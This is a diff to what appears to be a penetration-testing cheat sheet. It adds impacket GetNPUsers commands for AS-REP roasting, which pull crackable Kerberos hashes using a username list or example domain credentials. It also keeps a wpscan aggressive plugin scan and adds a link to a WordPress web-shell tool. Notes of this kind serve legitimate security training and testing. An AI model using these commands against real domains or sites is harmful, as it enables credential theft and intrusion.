@@ -1911,7 +1911,11 @@ if `Pwn3d!` in output -> the user has `administrative privilege` -> use `--sam` 
 Condition: `Do not require Kerberos preauthentication` -> enabled
 **Perform attack on Kali:**
 ```bash
-impacket-GetNPUsers -dc-ip 192.168.189.70  -request -outputfile hashe corp.com/pete
+#Try all the usernames in usernames.txt
+python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+
+#Use domain creds to extract targets and target them
+python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
 ```
 **Perform Attack on Windows**:
 ```powershell
@@ -2123,10 +2127,12 @@ host2
 	- port.nmap
 ```
 Folder: `host1`,`host2` ...
-## Wordpress scan
+## Wordpress
+Scan:
 ```bash
 wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
 ```
+[wordpress-shell](https://github.com/leonjza/wordpress-shell)
 ## Git
 ```bash
 git status
